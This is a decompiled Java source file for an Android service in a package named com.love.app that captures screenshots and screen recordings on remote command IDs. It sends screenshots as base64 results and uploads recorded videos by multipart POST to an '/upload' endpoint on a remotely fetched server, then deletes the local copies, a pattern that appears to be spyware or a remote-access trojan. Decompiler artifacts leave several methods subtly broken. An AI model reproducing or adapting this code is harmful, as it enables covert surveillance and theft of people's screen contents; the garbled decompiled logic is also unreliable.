/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.hardware.display.VirtualDisplay
 *  android.media.Image
 *  android.media.ImageReader
 *  android.media.MediaRecorder
 *  android.media.projection.MediaProjection
 *  android.media.projection.MediaProjectionManager
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.util.Base64
 *  android.util.DisplayMetrics
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.love.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.love.app.ConfigFetcher;
import com.love.app.ForegroundService;
import com.love.app.ScreenCaptureService$$ExternalSyntheticLambda0;
import com.love.app.ScreenCaptureService$$ExternalSyntheticLambda1;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FilterOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.Buffer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import org.json.JSONObject;

public class ScreenCaptureService
extends Service {
    public static final String ACTION_RECORD_START = "record_start";
    public static final String ACTION_RECORD_STOP = "record_stop";
    public static final String ACTION_SCREENSHOT = "screenshot";
    private static final String CHANNEL_ID = "screen_capture";
    public static final String EXTRA_CMD_ID = "cmd_id";
    public static final String EXTRA_DATA = "data";
    public static final String EXTRA_RESULT_CODE = "result_code";
    private static final int NOTIF_ID = 8888;
    private static final String TAG = "ScreenCaptureService";
    private Handler handler = new Handler(Looper.getMainLooper());
    private ImageReader imageReader;
    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private MediaProjectionManager mpm;
    private boolean recording = false;
    private String recordingFilePath;
    private int screenDpi;
    private int screenHeight;
    private int screenWidth;
    private VirtualDisplay virtualDisplay;

    private void cleanup() {
        ImageReader imageReader = this.imageReader;
        if (imageReader != null) {
            imageReader.close();
            this.imageReader = null;
        }
        if ((imageReader = this.virtualDisplay) != null) {
            imageReader.release();
            this.virtualDisplay = null;
        }
        if ((imageReader = this.mediaProjection) != null) {
            imageReader.stop();
            this.mediaProjection = null;
        }
    }

    private void startForegroundNotif() {
        NotificationChannel notificationChannel;
        if (Build.VERSION.SDK_INT >= 26) {
            notificationChannel = new NotificationChannel(CHANNEL_ID, (CharSequence)"Screen Capture", 2);
            NotificationManager notificationManager = (NotificationManager)this.getSystemService("notification");
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        notificationChannel = new NotificationCompat.Builder((Context)this, CHANNEL_ID).setContentTitle("Mengambil data layar").setSmallIcon(17301559).setPriority(-1).setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= 29) {
            this.startForeground(8888, (Notification)notificationChannel, 32);
        } else {
            this.startForeground(8888, (Notification)notificationChannel);
        }
    }

    private void startRecording(String string2) {
        try {
            Object object = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
            Comparable<Date> comparable = new Comparable<Date>();
            object = ((DateFormat)object).format((Date)comparable);
            comparable = new Comparable<Date>();
            this.recordingFilePath = ((StringBuilder)comparable).append(this.getCacheDir()).append("/rec_").append((String)object).append(".mp4").toString();
            comparable = new Comparable<Date>();
            this.mediaRecorder = comparable;
            comparable.setVideoSource(2);
            this.mediaRecorder.setOutputFormat(2);
            this.mediaRecorder.setOutputFile(this.recordingFilePath);
            this.mediaRecorder.setVideoEncoder(2);
            this.mediaRecorder.setVideoSize(this.screenWidth, this.screenHeight);
            this.mediaRecorder.setVideoFrameRate(30);
            this.mediaRecorder.setVideoEncodingBitRate(3000000);
            this.mediaRecorder.prepare();
            this.virtualDisplay = this.mediaProjection.createVirtualDisplay("ScreenRecord", this.screenWidth, this.screenHeight, this.screenDpi, 16, this.mediaRecorder.getSurface(), null, null);
            this.mediaRecorder.start();
            this.recording = true;
            this.getSharedPreferences("love_config", 0).edit().putString("record_path", this.recordingFilePath).apply();
            ForegroundService.sendResultStatic("record_status", "started", string2);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"MediaRecorder start error", (Throwable)exception);
            ForegroundService.sendResultStatic("record_error", "Recorder error: " + exception.getMessage(), string2);
            this.cleanup();
            this.stopSelf();
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void stopRecording(String var1_1) {
        if (this.recording && (var2_2 /* !! */  = this.mediaRecorder) != null) {
        }
        ** GOTO lbl20
        {
            catch (Exception var2_4) {
                Log.e((String)"ScreenCaptureService", (String)"stopRecording error", (Throwable)var2_4);
                ForegroundService.sendResultStatic("record_error", var2_4.getMessage(), var1_1);
                this.stopSelf();
                return;
            }
            try {
                var2_2 /* !! */ .stop();
                ** GOTO lbl17
            }
            catch (Exception var2_3) {}
            {
                Log.e((String)"ScreenCaptureService", (String)"stopRecording: recorder.stop() failed", (Throwable)var2_3);
lbl17:
                // 2 sources

                this.mediaRecorder.release();
                this.mediaRecorder = null;
                this.recording = false;
lbl20:
                // 2 sources

                if ((var2_2 /* !! */  = this.virtualDisplay) != null) {
                    var2_2 /* !! */ .release();
                    this.virtualDisplay = null;
                }
                if ((var2_2 /* !! */  = this.mediaProjection) != null) {
                    var2_2 /* !! */ .stop();
                    this.mediaProjection = null;
                }
                if ((var2_2 /* !! */  = this.recordingFilePath) == null) {
                    var2_2 /* !! */  = this.getSharedPreferences("love_config", 0).getString("record_path", null);
                }
                if (var2_2 /* !! */  == null) {
                    ForegroundService.sendResultStatic("record_status", "stopped", var1_1);
                    this.stopSelf();
                    return;
                }
                var3_5 = new File((String)var2_2 /* !! */ );
                if (var3_5.exists() && var3_5.length() > 0L) {
                    var2_2 /* !! */  = new ScreenCaptureService$$ExternalSyntheticLambda0(this, var3_5, var1_1);
                    var4_6 = new Thread((Runnable)var2_2 /* !! */ );
                    var4_6.start();
                    return;
                }
                ForegroundService.sendResultStatic("record_status", "stopped file missing", var1_1);
                this.stopSelf();
                return;
            }
        }
    }

    private void takeScreenshot(String string2) {
        try {
            Object object;
            this.imageReader = object = ImageReader.newInstance((int)this.screenWidth, (int)this.screenHeight, (int)1, (int)2);
            this.virtualDisplay = this.mediaProjection.createVirtualDisplay("ScreenCapture", this.screenWidth, this.screenHeight, this.screenDpi, 16, object.getSurface(), null, null);
            Handler handler = this.handler;
            object = new ScreenCaptureService$$ExternalSyntheticLambda1(this, string2);
            handler.postDelayed((Runnable)object, 300L);
        }
        catch (Exception exception) {
            ForegroundService.sendResultStatic("screenshot_error", exception.getMessage(), string2);
            this.stopSelf();
        }
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void uploadVideoFile(File file, String string2) {
        Throwable throwable2222222;
        block10: {
            block9: {
                Object object;
                block8: {
                    object = ConfigFetcher.getBaseUrl((Context)this);
                    if (object != null) break block8;
                    this.stopSelf();
                    return;
                }
                try {
                    int n;
                    Object object2 = new StringBuilder("===");
                    object2 = ((StringBuilder)object2).append(System.currentTimeMillis()).append("===").toString();
                    Object object3 = new StringBuilder();
                    Object object4 = new URL(((StringBuilder)object3).append((String)object).append("/upload").toString());
                    object = (HttpURLConnection)((URL)object4).openConnection();
                    ((URLConnection)object).setDoOutput(true);
                    ((HttpURLConnection)object).setRequestMethod("POST");
                    object4 = new StringBuilder("multipart/form-data; boundary=");
                    ((URLConnection)object).setRequestProperty("Content-Type", ((StringBuilder)object4).append((String)object2).toString());
                    object4 = new DataOutputStream(((URLConnection)object).getOutputStream());
                    object3 = new StringBuilder("--");
                    ((DataOutputStream)object4).writeBytes(((StringBuilder)object3).append((String)object2).append("\r\n").toString());
                    object3 = new StringBuilder("Content-Disposition: form-data; name=\"file\"; filename=\"");
                    ((DataOutputStream)object4).writeBytes(((StringBuilder)object3).append(file.getName()).append("\"\r\n").toString());
                    ((DataOutputStream)object4).writeBytes("Content-Type: video/mp4\r\n\r\n");
                    object3 = new FileInputStream(file);
                    byte[] byArray = new byte[16384];
                    while ((n = ((FileInputStream)object3).read(byArray)) != -1) {
                        ((DataOutputStream)object4).write(byArray, 0, n);
                    }
                    ((FileInputStream)object3).close();
                    object3 = new StringBuilder();
                    ((DataOutputStream)object4).writeBytes(((StringBuilder)object3).append("\r\n--").append((String)object2).append("--\r\n").toString());
                    ((DataOutputStream)object4).flush();
                    ((FilterOutputStream)object4).close();
                    if (((HttpURLConnection)object).getResponseCode() == 200) {
                        object4 = new InputStreamReader(((URLConnection)object).getInputStream());
                        object2 = new BufferedReader((Reader)object4);
                        if ((object = ((BufferedReader)object2).readLine()) != null) {
                            object4 = new JSONObject((String)object);
                            object4 = object4.optString("url");
                            object = new JSONObject();
                            object.put("type", (Object)"screen_record");
                            object.put("url", object4);
                            object.put("size", file.length());
                            ForegroundService.sendResultStatic("screen_record_complete", object.toString(), string2);
                        }
                        ((BufferedReader)object2).close();
                        file.delete();
                    }
                    break block9;
                }
                catch (Throwable throwable2222222) {
                    break block10;
                }
                catch (Exception exception) {
                    Log.e((String)TAG, (String)"Upload video failed", (Throwable)exception);
                    StringBuilder stringBuilder = new StringBuilder();
                    ForegroundService.sendResultStatic("record_error", stringBuilder.append("Upload failed: ").append(exception.getMessage()).toString(), string2);
                }
            }
            this.stopSelf();
            return;
        }
        this.stopSelf();
        throw throwable2222222;
    }

    /* synthetic */ void lambda$stopRecording$1$com_love_app_ScreenCaptureService(File file, String string2) {
        this.uploadVideoFile(file, string2);
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$takeScreenshot$0$com_love_app_ScreenCaptureService(String string2) {
        Throwable throwable2222222;
        block7: {
            block6: {
                Image image;
                block5: {
                    image = this.imageReader.acquireLatestImage();
                    if (image != null) break block5;
                    ForegroundService.sendResultStatic("screenshot_error", "frame null", string2);
                    this.cleanup();
                    this.stopSelf();
                    this.cleanup();
                    this.stopSelf();
                    return;
                }
                try {
                    Bitmap bitmap = image.getPlanes();
                    int n = image.getWidth();
                    int n2 = image.getHeight();
                    int n3 = bitmap[0].getPixelStride();
                    Object object = Bitmap.createBitmap((int)((bitmap[0].getRowStride() - n3 * n) / n3 + n), (int)n2, (Bitmap.Config)Bitmap.Config.ARGB_8888);
                    object.copyPixelsFromBuffer((Buffer)bitmap[0].getBuffer());
                    image.close();
                    bitmap = Bitmap.createBitmap((Bitmap)object, (int)0, (int)0, (int)n, (int)n2);
                    object.recycle();
                    object = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 85, (OutputStream)object);
                    bitmap.recycle();
                    ForegroundService.sendResultStatic(ACTION_SCREENSHOT, Base64.encodeToString((byte[])((ByteArrayOutputStream)object).toByteArray(), (int)2), string2);
                    break block6;
                }
                catch (Throwable throwable2222222) {
                    break block7;
                }
                catch (Exception exception) {
                    ForegroundService.sendResultStatic("screenshot_error", exception.getMessage(), string2);
                }
            }
            this.cleanup();
            this.stopSelf();
            return;
        }
        this.cleanup();
        this.stopSelf();
        throw throwable2222222;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.mpm = (MediaProjectionManager)this.getSystemService("media_projection");
        DisplayMetrics displayMetrics = this.getResources().getDisplayMetrics();
        this.screenWidth = displayMetrics.widthPixels;
        this.screenHeight = displayMetrics.heightPixels;
        this.screenDpi = displayMetrics.densityDpi;
        this.startForegroundNotif();
    }

    public void onDestroy() {
        super.onDestroy();
        this.cleanup();
        MediaRecorder mediaRecorder = this.mediaRecorder;
        if (mediaRecorder != null) {
            mediaRecorder.release();
            this.mediaRecorder = null;
        }
    }

    public int onStartCommand(Intent object, int n, int n2) {
        if (object == null) {
            this.stopSelf();
            return 2;
        }
        String string2 = object.getStringExtra("mode");
        n = object.getIntExtra(EXTRA_RESULT_CODE, -1);
        Intent intent = (Intent)object.getParcelableExtra(EXTRA_DATA);
        String string3 = object.getStringExtra(EXTRA_CMD_ID);
        object = string2;
        if (string2 == null) {
            object = ACTION_SCREENSHOT;
        }
        if (ACTION_RECORD_STOP.equals(object)) {
            this.stopRecording(string3);
            return 2;
        }
        if (n != -1 && intent != null) {
            string2 = this.mediaProjection;
            if (string2 != null) {
                string2.stop();
                this.mediaProjection = null;
            }
            this.mediaProjection = this.mpm.getMediaProjection(n, intent);
            if (ACTION_RECORD_START.equals(object)) {
                this.startRecording(string3);
            } else {
                this.takeScreenshot(string3);
            }
            return 2;
        }
        ForegroundService.sendResultStatic("screenshot_error", "No MediaProjection token", string3);
        this.stopSelf();
        return 2;
    }
}

